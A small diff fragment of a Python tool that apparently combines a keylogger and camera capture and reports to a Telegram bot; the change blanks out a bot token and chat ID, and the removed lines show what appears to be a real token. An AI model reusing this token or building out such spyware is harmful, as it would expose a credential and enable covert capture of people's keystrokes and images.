@@ -13,8 +13,8 @@ from datetime import datetime #for file creation
 import threading # f multi-processes[keylogger]or
 import cv2 # for camera
 
-BOT_TOKEN = '7958837921:AAE3B36Voc5ZAZTx5U1XV9DHmx3UIVl_05A'
-CHAT_ID = '5160506216'
+BOT_TOKEN = ''
+CHAT_ID = ''
 
 current_dir = os.getcwd()
 keylogger_running = False
